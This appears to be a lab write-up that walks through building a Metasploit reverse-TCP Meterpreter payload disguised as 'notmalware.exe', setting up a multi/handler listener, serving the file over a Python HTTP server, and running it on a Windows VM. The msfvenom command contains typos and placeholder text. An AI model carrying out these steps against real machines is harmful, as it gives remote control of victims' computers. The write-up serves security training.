# Endpoint Security Lab – Controlled TCP Reverse Shell Demonstration

⚠️ Disclaimer  
This lab is conducted in a fully isolated virtual environment for academic and cybersecurity research purposes only.  
All testing is performed on machines owned and controlled within the lab.

---

# 1. Lab Environment Overview

This endpoint security demonstration uses:

- A Linux machine (Attacker simulation)
- A Windows 11 machine (Target simulation)
- NAT Network (isolated lab network)

The objective is to understand:

- How reverse TCP payloads function
- How endpoint protection mechanisms detect threats
- How command-and-control (C2) communication is established
---
# 2. Metasploit Framework Installation (Linux)

On the Linux machine, the Metasploit Framework is installed from the official Rapid7 documentation:

https://docs.rapid7.com/metasploit/installing-the-metasploit-framework/

Metasploit is a penetration testing framework that allows security professionals to:

- Develop and execute exploit code
- Generate payloads
- Simulate real-world attack techniques
- Test endpoint security defenses

After installation:

- `msfconsole` is launched > press y to create a database
- The database is initialized when prompted

The database allows:
- Session tracking
- Module management
- Logging and reporting

---

# 3. Payload Generation – Conceptual Explanation

In this lab, a Windows executable payload is generated to simulate a reverse TCP connection.

### What is a Payload?

A payload is the code executed on the target machine after successful delivery.  
In this case, the payload is a **reverse TCP Meterpreter session**.

### Reverse TCP – How It Works

Instead of the attacker connecting to the victim:

- The victim machine initiates an outbound connection
- It connects back to the attacker’s IP and port
- This bypasses many firewall restrictions
- 
### PRE PAyload
1) open anotehr terminal and crate a new directory
  pwd
  mkdir malware ( example of directory )
2) crate a payload = smfvenom -p windows/meterpreter/reverse_TPC LHOST=metto mio ip LPORT=4444 esempio -f exe -o notmalware.exe

### Important Payload Parameters (Conceptual Explanation)

- `-p windows/meterpreter/reverse_tcp`  
  Defines the payload type:
  - `windows` → Target operating system
  - `meterpreter` → Advanced in-memory shell
  - `reverse_tcp` → Target initiates outbound TCP connection

- `LHOST`  
  The attacker's IP address (where the reverse connection will return)

- `LPORT`  
  The listening port on the attacker machine

- `-f exe`  
  Output file format (Windows executable)

- `-o filename.exe`  
  Output file name

---

## Alternative Payload Variants (High-Level Overview)

Different payload types exist depending on testing needs:

- `reverse_tcp` → Most common, outbound connection
- `reverse_https` → Encrypted HTTPS communication (harder to detect)
- `bind_tcp` → Target opens a listening port (less stealthy)
- Staged vs Stageless payloads:
  - Staged → Smaller initial loader, downloads additional components
  - Stageless → Full payload embedded in single file

Each has different detection and network visibility characteristics.

## EXAMPLE
linux/x86/meterpreter/reverse_tcp (For Linux targets)

windows/x64/meterpreter_reverse_tcp (For 64-bit Windows targets, staged)

java/jsp_shell_reverse_tcp (For web servers)

windows/meterpreter_reverse_http or reverse_https (To tunnel traffic over HTTP/HTTPS, mimicking web traffic)

---

# 4. Multi/Handler Listener Configuration

Return to the msfconsole terminal.

Set up the exploit handler:

- use exploit/multi/handler
This command selects a generic handler that can receive connections from various payloads.

Configure the payload:

- set payload windows/meterpreter/reverse_tcp
This must match the payload we generated with msfvenom.

Set the options:

- set LPORT 4444
- set LHOST enp0s3
- set LPORT 4444: Sets the listening port, which must match the port we used in the payload.
- set LHOST enp0s3: You can specify the IP address or, as shown here, the network interface name (e.g., eth0, enp0s3). Metasploit will automatically bind to the IP address associated with that interface.

Execute the listener:

- exploit
On the Linux attacker machine, a listener is configured.

The listener:

- Waits for incoming reverse connections
- Uses the same payload configuration
- Listens on the defined LHOST and LPORT

Conceptually:

1. Select the handler module
2. Define payload type
3. Set local IP
4. Set local port
5. Start listener

When the Windows machine executes the payload, it initiates a TCP session back to the handler.

---
## Open a new terminal (your third one).

Navigate to the directory containing the payload:

- cd ~/malware

Start a Python HTTP server:

-python3 -m http.server 8000
This will serve all files in the current directory over HTTP on port 8000.

# 5. Payload Delivery Simulation

To simulate delivery in a lab environment:

- A temporary HTTP server is started on Linux
- The Windows machine accesses the file via browser
- The executable is downloaded locally

This simulates:

- User-driven download
- Social engineering scenarios
- Drive-by download concepts

---

# 6. Reverse Session Establishment

If execution is successful:

- Windows initiates outbound TCP connection
- Linux handler receives session
- Meterpreter session becomes active

At this point, the Linux machine has remote command execution capabilities within the Windows VM.

This simulates:

- Post-exploitation behavior
- Command and Control (C2)
- Lateral movement preparation
- Privilege escalation testing (if applicable)

## Open Command Prompt.

Navigate to the Downloads folder:

cd C:\Users\tcm\Downloads
Execute the malware:

notmalware.exe
